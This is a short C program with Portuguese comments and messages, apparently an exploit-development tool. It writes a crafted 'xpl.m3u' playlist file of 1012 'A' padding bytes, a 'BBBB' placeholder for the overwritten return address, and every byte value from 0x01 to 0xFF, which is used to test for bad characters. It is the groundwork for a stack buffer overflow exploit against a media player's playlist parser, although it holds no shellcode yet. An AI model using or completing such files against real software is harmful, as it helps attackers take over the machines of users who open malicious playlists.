#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void)
{
	int i;
	FILE *arquivo;
	unsigned char lixo[1013];
	unsigned char ret[] = "BBBB";
	memset(lixo,0,1013*sizeof(char));
	memset(lixo,'A',1012*sizeof(char));

	arquivo = fopen("xpl.m3u","wb");
	if(!arquivo)
	{
		printf("Nao foi possivel criar arquivo para escrita!");
		exit(1);
	}
	fwrite(lixo,1,1012,arquivo);
	fputs(ret,arquivo);
	for(i=0;i<=0XFF;i++)
	{
		if(i == 0x0) continue; //if(i == 0x0a) continue; e assim sucessivamente..
		fwrite(&i,1,1,arquivo);
	}


	fclose(arquivo);
	return 0;



}
